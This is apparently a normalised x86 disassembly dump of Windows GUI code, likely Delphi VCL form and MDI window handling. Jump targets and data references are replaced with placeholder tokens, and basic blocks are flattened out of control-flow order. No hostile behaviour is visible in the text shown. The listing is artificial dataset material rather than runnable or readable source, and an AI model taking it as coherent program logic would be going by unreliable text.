cmp [ ebx + 0x22f ] 0x1
jne r-xdata
add esp 0x10
pop esi
pop ebx
retn
cmp [ ebx + 0x22f ] 0x1
jne r-xdata
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
test [ ebx + 0x1c ] 0x10
jne r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
mov eax [ eax + 0x170 ]
call sub_41fcf4
push eax
lea edx [ esp + 0x4 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea eax [ esp + 0x4 ]
push eax
mov eax [ esi + 0x4 ]
push eax
call FillRect
jmp r-xdata
sub_44ffd4
push esi
push edi
mov edi edx
mov esi eax
mov eax esi
call sub_43b8e8
push eax
call IsIconic
test eax eax
jne r-xdata
mov [ edi ] 0x27
mov edx edi
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
pop edi
pop esi
retn
mov edx edi
mov eax esi
call sub_439d3c
pop edi
pop esi
retn
sub_450020
push ebp
mov ebp esp
push ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp [ eax + 0x229 ] 0x0
je r-xdata
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
test [ eax + 0x228 ] 0x1
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp [ eax + 0x22f ] 0x1
je r-xdata
push 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_43b8e8
push eax
call GetSystemMenu
mov ebx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp [ eax + 0x229 ] 0x3
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
test [ eax + 0x228 ] 0x2
jne r-xdata
push 0x0
push 0xf130
push ebx
call DeleteMenu
push 0x400
push 0x7
push ebx
call DeleteMenu
push 0x400
push 0x5
push ebx
call DeleteMenu
push 0x0
push 0xf030
push ebx
call DeleteMenu
push 0x0
push 0xf020
push ebx
call DeleteMenu
push 0x0
push 0xf000
push ebx
call DeleteMenu
push 0x0
push 0xf120
push ebx
call DeleteMenu
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
test [ eax + 0x228 ] 0x4
jne r-xdata
push 0x1
push 0xf020
push ebx
call EnableMenuItem
push 0x1
push 0xf030
push ebx
call EnableMenuItem
sub_45011c
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x248 ]
mov eax [ ebp - 0x4 ]
call sub_44eb44
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x10
jne r-xdata
pop ecx
pop ebp
retn
push ebp
call sub_450020
pop ecx
sub_450150
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ esi + 0x4 ] 0x2
jne r-xdata
mov edx esi
mov eax ebx
call sub_4367d0
cmp [ ebx + 0x9b ] 0x1
jne r-xdata
test [ ebx + 0x1c ] 0x10
jne r-xdata
mov eax ebx
call sub_43b8e8
push eax
call IsIconic
test eax eax
jne r-xdata
push 0x7
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
mov eax ebx
call sub_43b8e8
push eax
call SetWindowPos
mov eax [ esi + 0x8 ]
push eax
mov eax [ esi + 0x4 ]
push eax
push 0xa2
mov eax ebx
call sub_43b8e8
push eax
call PostMessageA
cmp [ ebx + 0x22e ] 0x0
je r-xdata
pop esi
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0x54 ]
mov edx eax
xor dl 0x1
or ecx 0xffffffff
mov eax ebx
call sub_4357a8
pop esi
pop ebx
retn
sub_4501e0
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
cmp [ ebx + 0x248 ] 0x0
je r-xdata
push 0x0
push 0x1
push 0x80
mov eax ebx
call sub_43b8e8
push eax
call SendMessageA
mov edx esi
mov eax ebx
call sub_43ab3c
pop esi
pop ebx
retn
cmp [ ebx + 0x22f ] 0x1
je r-xdata
push 0x0
mov eax ebx
call sub_43b8e8
push eax
call SetMenu
xor edx edx
mov eax [ ebx + 0x248 ]
call sub_448654
sub_450240
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ esi + 0x8 ] 0x0
jne r-xdata
mov edx esi
mov eax ebx
call sub_439bd8
cmp [ ebx + 0x248 ] 0x0
je r-xdata
mov dx [ esi + 0x4 ]
mov eax [ ebx + 0x248 ]
call sub_448068
test al al
jne r-xdata
pop esi
pop ebx
retn
sub_45028c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x248 ]
test eax eax
je r-xdata
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov edx esi
call sub_4488c8
cmp [ esi + 0xc ] 0x0
jne r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
pop esi
pop ebx
retn
sub_4502c4
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi eax
xor eax eax
push ebp
push sub_45035f
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ edi + 0x248 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_450366
lea eax [ ebp - 0x4 ]
call sub_403e9c
retn
xor esi esi
cmp [ edx + 0x6 ] 0xffff
jne r-xdata
xor ebx ebx
movzx eax [ edx + 0x4 ]
test [ edx + 0x6 ] 0x10
je r-xdata
cmp [ edx + 0x4 ] 0x0
je r-xdata
mov ecx ebx
mov edx eax
mov eax [ edi + 0x248 ]
call sub_447fc8
mov esi eax
mov bl 0x1
push eax
mov eax [ edx + 0x8 ]
push eax
call GetSubMenu
test esi esi
je r-xdata
xor edx edx
mov eax [ rw-data ]
call sub_455080
lea edx [ ebp - 0x4 ]
mov eax [ esi + 0x58 ]
call sub_432270
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_455080
jmp r-xdata
sub_45038c
push ebx
push esi
mov ebx eax
test [ ebx + 0x1c ] 0x10
jne r-xdata
cmp dl 0x1
je r-xdata
mov [ ebx + 0x22b ] dl
cmp [ ebx + 0x264 ] 0x0
je r-xdata
mov eax ebx
mov si 0xffd0
call sub_403360
pop esi
pop ebx
retn
mov eax [ ebx + 0x264 ]
mov edx [ eax ]
call [ edx + 0x10 ]
sub_4503cc
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0xe4 ]
test al al
je r-xdata
xor eax eax
jmp r-xdata
call sub_40c89c
test al al
jne r-xdata
and eax 0x7f
mov [ esi + 0xc ] eax
pop esi
pop ebx
retn
mov al 0x1
sub_4503f8
push ebx
push esi
mov ebx edx
xor edx edx
mov [ ebx + 0xc ] edx
test [ eax + 0x1c ] 0x10
jne r-xdata
mov esi [ ebx + 0x8 ]
xor edx edx
call sub_44fbb8
movzx ecx [ esi + 0x8 ]
mov edx [ esi + 0x4 ]
mov eax 0xb017
call sub_432048
test eax eax
je r-xdata
cmp [ eax + 0x22f ] 0x1
je r-xdata
pop esi
pop ebx
retn
mov [ ebx + 0xc ] 0x1
cmp [ eax + 0x248 ] 0x0
je r-xdata
mov edx [ eax + 0x248 ]
cmp [ edx + 0x5c ] 0x0
je r-xdata
sub_450450
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ esi + 0x4 ]
and eax 0xfff0
cmp eax 0xf020
jne r-xdata
mov eax [ esi + 0x4 ]
and eax 0xfff0
cmp eax 0xf010
jne r-xdata
mov eax [ rw-data ]
cmp ebx [ eax + 0x44 ]
jne r-xdata
mov edx esi
mov eax ebx
call sub_43aa20
test [ ebx + 0x1c ] 0x10
jne r-xdata
mov edx esi
mov eax [ rw-data ]
call sub_453a34
jmp r-xdata
test [ ebx + 0x1c ] 0x10
jne r-xdata
cmp eax 0xf120
jne r-xdata
cmp [ ebx + 0x5b ] 0x0
je r-xdata
mov eax [ esi + 0x4 ]
and eax 0xfff0
cmp eax 0xf020
je r-xdata
pop esi
pop ebx
retn
cmp [ ebx + 0x5b ] 0x0
je r-xdata
cmp [ ebx + 0x22b ] 0x1
jne r-xdata
mov eax ebx
mov si 0xffd0
call sub_403360
sub_4504dc
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ esi + 0x8 ]
dec eax
je r-xdata
mov eax ebx
call sub_43b8e8
push eax
call IsIconic
test eax eax
je r-xdata
sub eax 0x2
je r-xdata
mov eax ebx
call sub_43b8e8
push eax
call IsZoomed
test eax eax
je r-xdata
mov [ ebx + 0x22c ] 0x2
jmp r-xdata
cmp [ ebx + 0x22c ] 0x0
je r-xdata
jmp r-xdata
mov [ ebx + 0x22c ] 0x1
mov [ ebx + 0x22c ] 0x3
jmp r-xdata
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
pop esi
pop ebx
retn
pop esi
pop ebx
retn
xor eax eax
mov al [ ebx + 0x22c ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax ebx
call sub_43b8e8
push eax
call ShowWindow
mov [ ebx + 0x22c ] 0x0
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_450574
push ebx
push esi
mov ebx edx
mov esi eax
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
cmp [ esi + 0x22f ] 0x1
jne r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_43b8e8
cmp eax [ ebx + 0x8 ]
sete al
mov ebx eax
mov edx ebx
mov eax esi
call sub_44fb54
test bl bl
je r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
test [ eax + 0x54 ] 0x4
je r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
mov dl 0x1
mov si 0xffd1
call sub_403360
sub_4505cc
cmp [ edx + 0x8 ] 0x0
je r-xdata
push 0x1
mov ecx [ edx + 0x4 ]
cmp ecx 0x1
sbb ecx ecx
neg ecx
mov edx [ eax + 0x220 ]
call sub_43be1c
retn
mov eax [ edx + 0x4 ]
push eax
call SetFocus
retn
sub_4505f8
push ebx
push esi
mov esi edx
mov ebx eax
xor edx edx
mov eax ebx
call sub_44fbb8
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
pop esi
pop ebx
retn
sub_450614
push ebp
mov ebp esp
push ebx
mov ebx eax
xor eax eax
test ebx ebx
je r-xdata
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x8 ]
mov edx [ eax + 0x8 ]
mov cl 0x1
mov eax ebx
call sub_447ff8
test eax eax
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x8 ]
mov edx [ eax + 0xc ]
xor ecx ecx
mov eax ebx
call sub_447ff8
sub_450654
push ebx
push esi
mov esi eax
xor ebx ebx
cmp [ esi + 0x150 ] 0x1
jne r-xdata
cmp [ esi + 0x150 ] 0x0
jne r-xdata
cmp [ esi + 0x158 ] 0x0
je r-xdata
mov eax ebx
pop esi
pop ebx
retn
cmp [ esi + 0x154 ] 0x0
je r-xdata
mov bl 0x1
jmp r-xdata
mov bl 0x1
sub_45068c
push ebp
mov ebp esp
push ebx
mov ebx eax
cmp [ ebx + 0x150 ] 0x1
jne r-xdata
mov [ edx ] 0x0
mov eax [ ebp + 0x8 ]
mov edx [ ebx + 0x154 ]
call sub_403ef0
mov [ edx ] 0x1
mov eax [ ebx + 0x158 ]
mov [ ecx ] eax
jmp r-xdata
pop ebx
pop ebp
retn 0x4
sub_4506c0
push ebp
mov ebp esp
add esp 0xffffffdc
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x10 ] ecx
mov [ ebp - 0x4 ] edx
mov esi eax
xor eax eax
push ebp
push sub_450811
push [ fs : eax ]
mov [ fs : eax ] esp
test [ esi + 0x1c ] 0x10
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_450818
lea eax [ ebp - 0x10 ]
call sub_403e9c
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
cmp [ eax + 0x4 ] 0x1
jne r-xdata
mov [ ebp - 0x9 ] 0x1
push ebp
mov eax [ esi + 0x248 ]
call sub_450614
pop ecx
mov [ ebp - 0x8 ] eax
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
mov eax [ eax + 0xc ]
call sub_431fec
mov ebx eax
jmp r-xdata
lea ecx [ ebp - 0x24 ]
xor edx edx
xor eax eax
call sub_4156bc
lea edx [ ebp - 0x24 ]
lea ecx [ ebp - 0x1c ]
mov eax esi
call sub_434c24
lea eax [ ebp - 0x1c ]
call sub_406a08
mov [ ebp - 0x14 ] eax
push ebp
mov eax [ esi + 0x7c ]
call sub_450614
pop ecx
mov [ ebp - 0x8 ] eax
test ebx ebx
je r-xdata
cmp [ ebp - 0x9 ] 0x1
jne r-xdata
cmp [ ebp - 0x9 ] 0x1
jne r-xdata
test ebx ebx
je r-xdata
mov eax ebx
call sub_450654
test al al
je r-xdata
cmp [ ebp - 0x9 ] 0x0
jne r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ rw-data ]
call sub_454d24
jmp r-xdata
mov ecx [ ebp - 0x14 ]
mov edx 0xd
mov eax [ rw-data ]
call sub_454d8c
mov ecx [ ebp - 0x8 ]
mov edx 0x8
mov eax [ rw-data ]
call sub_454d8c
jmp r-xdata
lea eax [ ebp - 0x10 ]
push eax
lea ecx [ ebp - 0x8 ]
lea edx [ ebp - 0x9 ]
mov eax ebx
call sub_45068c
lea ecx [ ebp - 0x24 ]
xor edx edx
xor eax eax
call sub_4156bc
lea edx [ ebp - 0x24 ]
lea ecx [ ebp - 0x1c ]
mov eax ebx
call sub_434c24
lea eax [ ebp - 0x1c ]
call sub_406a08
mov [ ebp - 0x14 ] eax
jmp r-xdata
mov ebx [ ebx + 0x30 ]
mov edx [ ebp - 0x10 ]
mov eax [ rw-data ]
call sub_454cbc
test [ esi + 0x228 ] 0x8
je r-xdata
sub_450820
push ebx
push esi
push ecx
mov [ esp ] edx
mov esi eax
test [ esi + 0x1c ] 0x2
jne r-xdata
mov edx [ esp ]
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
pop edx
pop esi
pop ebx
retn
cmp [ esi + 0x22a ] 0x0
je r-xdata
mov edx [ esp ]
mov edx [ edx + 0x8 ]
mov eax [ esi + 0x74 ]
lea ecx [ edx + 0x18 ]
mov ebx [ eax + 0x14 ]
test ebx ebx
jbe r-xdata
mov ebx [ eax + 0x10 ]
test ebx ebx
jbe r-xdata
mov [ ecx ] ebx
lea ecx [ edx + 0x20 ]
mov ebx [ eax + 0xc ]
test ebx ebx
jbe r-xdata
mov [ ecx + 0x4 ] ebx
mov ebx [ eax + 0x8 ]
test ebx ebx
jbe r-xdata
mov [ ecx ] ebx
lea eax [ edx + 0x20 ]
push eax
lea eax [ edx + 0x24 ]
push eax
lea ecx [ edx + 0x1c ]
lea eax [ edx + 0x18 ]
mov edx eax
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x38 ]
mov [ ecx + 0x4 ] ebx
sub_450894
push ebp
mov ebp esp
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx ]
add eax ecx
sub eax esi
cdq
xor eax edx
sub eax edx
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
cmp eax [ edx + 0x2e4 ]
jge r-xdata
pop esi
pop ebx
pop ebp
retn
sub esi ecx
mov [ ebx ] esi
sub_4508c0
push ebp
mov ebp esp
add esp 0xffffffdc
push ebx
push esi
mov ebx edx
mov [ ebp - 0x4 ] eax
mov edx [ ebp - 0x4 ]
cmp [ edx + 0x2e2 ] 0x0
je r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_439e84
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebx + 0x8 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov esi [ ebx + 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_44e8d0
lea edx [ ebp - 0x14 ]
call sub_452098
push ebp
mov eax [ ebp - 0x4 ]
call sub_44e8d0
lea edx [ ebp - 0x24 ]
call sub_452098
mov ecx [ ebp - 0x24 ]
lea eax [ esi + 0x8 ]
mov edx [ ebp - 0x14 ]
call sub_450894
pop ecx
push ebp
mov eax [ ebp - 0x4 ]
call sub_44e8d0
lea edx [ ebp - 0x24 ]
call sub_452098
mov ecx [ ebp - 0x20 ]
lea eax [ esi + 0xc ]
mov edx [ ebp - 0x10 ]
call sub_450894
pop ecx
push ebp
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x48 ]
lea eax [ esi + 0x8 ]
mov edx [ ebp - 0xc ]
call sub_450894
pop ecx
push ebp
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x4c ]
lea eax [ esi + 0xc ]
mov edx [ ebp - 0x8 ]
call sub_450894
pop ecx
cmp [ eax + 0xc ] 0x0
je r-xdata
sub_450978
push ebx
push esi
mov ebx eax
test [ ebx + 0x1c ] 0x2
jne r-xdata
or [ ebx + 0x2f4 ] 0x20
pop esi
pop ebx
retn
mov eax ebx
mov si 0xffb3
call sub_403360
pop esi
pop ebx
retn
sub_45099c
push ebx
push esi
mov ebx eax
test [ ebx + 0x1c ] 0x2
jne r-xdata
and [ ebx + 0x2f4 ] 0xdf
pop esi
pop ebx
retn
mov eax ebx
mov si 0xffb1
call sub_403360
pop esi
pop ebx
retn
sub_4509c0
push ebx
push esi
mov esi edx
mov ebx eax
push 0x12
call GetKeyState
test ax ax
jl r-xdata
mov edx esi
mov eax ebx
call sub_43ad64
mov ax [ esi + 0x4 ]
sub ax 0x9
je r-xdata
push 0x11
call GetKeyState
test ax ax
jl r-xdata
add eax 0xffffffe4
sub ax 0x4
jb r-xdata
push 0x1
push 0x10
call GetKeyState
test ax ax
setge cl
mov edx [ ebx + 0x220 ]
mov eax ebx
call sub_43be1c
mov [ esi + 0xc ] 0x1
pop esi
pop ebx
retn
mov eax [ ebx + 0x220 ]
test eax eax
je r-xdata
jmp r-xdata
pop esi
pop ebx
retn
push 0x0
mov dx [ esi + 0x4 ]
cmp dx 0x27
je r-xdata
mov cl 0x1
cmp dx 0x28
je r-xdata
xor ecx ecx
jmp r-xdata
mov edx [ eax + 0x30 ]
xchg edx eax
call sub_43be1c
mov [ esi + 0xc ] 0x1
pop esi
pop ebx
retn
sub_450a5c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_450fc6
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x10
jne r-xdata
mov eax [ rw-data ]
call sub_455170
mov eax [ ebp - 0x4 ]
or [ eax + 0x2f4 ] 0x4
xor edx edx
push ebp
push sub_450fa9
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x10
jne r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x2f4 ] 0x4
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_450fb0
mov eax [ ebp - 0x4 ]
and [ eax + 0x2f4 ] 0xfb
retn
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1a6 ] 0x0
je r-xdata
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
call sub_405c20
mov ecx [ ebp - 0x8 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b424
call sub_4038d8
xor eax eax
push ebp
push j_sub_4035ec#5
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov si 0xffaf
call sub_403360
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor eax eax
push ebp
push j_sub_4035ec#6
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov si 0xffae
call sub_403360
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x6c ]
cmp eax [ ebp - 0x4 ]
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x230 ] 0x4
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22f ] 0x1
jne r-xdata
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_44fc08
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22f ] 0x1
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x230 ] 0x6
jne r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x2f4 ] 0x8
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_438e40
jmp r-xdata
mov eax [ rw-data ]
call sub_4522f4
mov ebx eax
mov eax [ ebp - 0x4 ]
sub ebx [ eax + 0x48 ]
sar ebx 0x1
jns r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
call sub_434b10
mov ebx eax
mov eax [ ebp - 0x4 ]
sub ebx [ eax + 0x48 ]
sar ebx 0x1
jns r-xdata
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x230 ]
mov edx eax
add dl 0xfa
sub dl 0x2
jae r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22f ] 0x1
jne r-xdata
xor ebx ebx
mov eax [ ebp - 0x4 ]
call sub_43b8e8
mov esi eax
call GetActiveWindow
cmp esi eax
jne r-xdata
push 0x97
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
mov eax [ ebp - 0x4 ]
call sub_43b8e8
push eax
call SetWindowPos
jmp r-xdata
mov eax [ rw-data ]
call sub_4522e8
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x4c ]
sar eax 0x1
jns r-xdata
adc ebx 0x0
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
call sub_434b54
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x4c ]
sar eax 0x1
jns r-xdata
adc ebx 0x0
cmp al 0x5
jne r-xdata
mov eax [ rw-data ]
mov esi [ eax + 0x44 ]
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x230 ] 0x7
jne r-xdata
test ebx ebx
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_43b8e8
push eax
call IsIconic
test eax eax
jne r-xdata
test ebx ebx
jge r-xdata
adc eax 0x0
adc eax 0x0
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x230 ] 0x0
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22f ] 0x1
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22f ] 0x1
jne r-xdata
test esi esi
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx [ r-xdata ]
call sub_4032f0
test al al
je r-xdata
push 0x0
mov eax [ ebp - 0x4 ]
call sub_43b8e8
push eax
call ShowWindow
push 0x97
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
mov eax [ ebp - 0x4 ]
call sub_43b8e8
push eax
call SetWindowPos
push ebx
call SetActiveWindow
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_43b8e8
call sub_44b86c
mov ebx eax
test eax eax
jge r-xdata
xor ebx ebx
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x22b ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ ebp - 0x4 ]
call sub_43b8e8
push eax
call ShowWindow
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22b ] 0x2
jne r-xdata
mov eax [ rw-data ]
call sub_452324
mov ebx eax
mov eax [ ebp - 0x4 ]
sub ebx [ eax + 0x48 ]
sar ebx 0x1
jns r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
call sub_434b10
mov ebx eax
mov eax [ ebp - 0x4 ]
sub ebx [ eax + 0x48 ]
sar ebx 0x1
jns r-xdata
mov eax [ rw-data ]
call sub_4522f4
mov ebx eax
mov eax [ ebp - 0x4 ]
sub ebx [ eax + 0x48 ]
sar ebx 0x1
jns r-xdata
mov ebx [ esi + 0x48 ]
mov eax [ ebp - 0x4 ]
sub ebx [ eax + 0x48 ]
sar ebx 0x1
jns r-xdata
mov eax [ ebp - 0x4 ]
mov esi [ eax + 0x4 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x48 ]
push edx
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x4c ]
push edx
mov ecx eax
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x84 ]
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x57 ] 0x0
je r-xdata
xor eax eax
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x22b ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ ebp - 0x4 ]
call sub_43b8e8
push eax
call ShowWindow
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x48 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x4c ]
shl edx 0x10
or eax edx
push eax
push 0x0
push 0x5
mov eax [ ebp - 0x4 ]
call sub_43b8e8
push eax
push DefMDIChildProcA
call CallWindowProcA
mov eax [ ebp - 0x4 ]
call sub_43536c
push 0x0
mov eax [ ebp - 0x4 ]
call sub_43b8e8
push eax
push 0x223
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
mov eax [ eax + 0x254 ]
push eax
call SendMessageA
push 0x3
mov eax [ ebp - 0x4 ]
call sub_43b8e8
push eax
call ShowWindow
jmp r-xdata
mov eax [ rw-data ]
call sub_452318
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x4c ]
sar eax 0x1
jns r-xdata
adc ebx 0x0
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
call sub_434b54
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x4c ]
sar eax 0x1
jns r-xdata
adc ebx 0x0
mov eax [ rw-data ]
call sub_4522e8
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x4c ]
sar eax 0x1
jns r-xdata
adc ebx 0x0
add ebx [ esi + 0x40 ]
mov eax [ esi + 0x4c ]
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x4c ]
sar eax 0x1
jns r-xdata
adc ebx 0x0
mov eax [ ebp - 0x4 ]
call sub_44eeb8
jmp r-xdata
push 0x0
push 0x0
push 0x234
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
mov eax [ eax + 0x254 ]
push eax
call SendMessageA
jmp r-xdata
test ebx ebx
jge r-xdata
adc eax 0x0
adc eax 0x0
jmp r-xdata
test ebx ebx
jge r-xdata
adc eax 0x0
add eax [ esi + 0x44 ]
jmp r-xdata
adc eax 0x0
test eax eax
jge r-xdata
xor ebx ebx
test eax eax
jge r-xdata
xor ebx ebx
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x48 ]
push edx
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x4c ]
push edx
mov ecx eax
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x84 ]
xor eax eax
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x48 ]
push edx
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x4c ]
push edx
mov ecx eax
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x84 ]
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x57 ] 0x0
je r-xdata
xor eax eax
mov eax [ ebp - 0x4 ]
call sub_44eeb8
jmp r-xdata
sub_450b19
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_454884
call sub_403954
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x230 ] 0x4
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22f ] 0x1
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x230 ] 0x6
jne r-xdata
mov eax [ rw-data ]
call sub_4522f4
mov ebx eax
mov eax [ ebp - 0x4 ]
sub ebx [ eax + 0x48 ]
sar ebx 0x1
jns r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
call sub_434b10
mov ebx eax
mov eax [ ebp - 0x4 ]
sub ebx [ eax + 0x48 ]
sar ebx 0x1
jns r-xdata
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x230 ]
mov edx eax
add dl 0xfa
sub dl 0x2
jae r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22f ] 0x1
jne r-xdata
mov eax [ rw-data ]
call sub_4522e8
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x4c ]
sar eax 0x1
jns r-xdata
adc ebx 0x0
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
call sub_434b54
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x4c ]
sar eax 0x1
jns r-xdata
adc ebx 0x0
cmp al 0x5
jne r-xdata
mov eax [ rw-data ]
mov esi [ eax + 0x44 ]
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x230 ] 0x7
jne r-xdata
test ebx ebx
jge r-xdata
adc eax 0x0
adc eax 0x0
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x230 ] 0x0
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22f ] 0x1
jne r-xdata
mov eax [ ebp - 0x4 ]
